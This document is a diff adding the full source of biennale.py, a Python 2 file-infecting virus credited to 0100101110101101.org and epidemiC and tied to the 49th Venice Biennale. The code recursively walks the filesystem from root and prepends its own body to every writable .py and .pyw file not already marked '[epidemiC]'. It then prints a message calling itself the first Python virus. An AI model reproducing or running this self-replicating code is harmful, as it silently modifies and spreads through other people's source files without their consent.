@@ -1,0 +1,47 @@
+# biennale.py ________________ go         to _____ 49th Biennale di Venezia
+# HTTP://WWW.0100101110101101.ORG __ + __ [epidemiC] http://www.epidemic.ws
+from dircache import *
+from string import *
+import os, sys
+from stat import *
+
+def fornicate(guest):
+    try:
+        soul = open(guest, "r")
+        body = soul.read()
+        soul.close()
+        if find(body, "[epidemiC]") == -1:
+            soul = open(guest, "w")
+            soul.write(mybody + "\n\n" + body)
+            soul.close()
+    except IOError: pass        
+
+def chat(party, guest):
+    if split(guest, ".")[-1] in ("py", "pyw"):
+        fornicate(party + guest)
+
+def join(party):
+    try:
+        if not S_ISLNK(os.stat(party)[ST_MODE]):
+            guestbook = listdir(party)
+            if party != "/": party = party + "/"
+            if not lower(party) in wank and not "__init__.py" in guestbook:
+                for guest in guestbook:
+                    chat(party, guest)
+                    join(party + guest)
+    except OSError: pass
+        
+if __name__ == '__main__':
+        mysoul = open(sys.argv[0])
+        mybody = mysoul.read()
+        mybody = mybody[:find(mybody, "#"*3) + 3]
+        mysoul.close()
+        blacklist = replace(split(sys.exec_prefix,":")[-1], "\\", "/")
+        if blacklist[-1] != "/": blacklist = blacklist + "/"
+        wank = [lower(blacklist), "/proc/", "/dev/"]
+        join("/")
+        print ">      This file was contaminated by biennale.py, the world slowest virus."
+        print "Either Linux or Windows, biennale.py is definetely the first Python virus."
+        print "[epidemiC] http://www.epidemic.ws __ + __ HTTP://WWW.0100101110101101.ORG "
+        print "> ______________________ 49th Biennale di Venezia ______________________ <"
+###
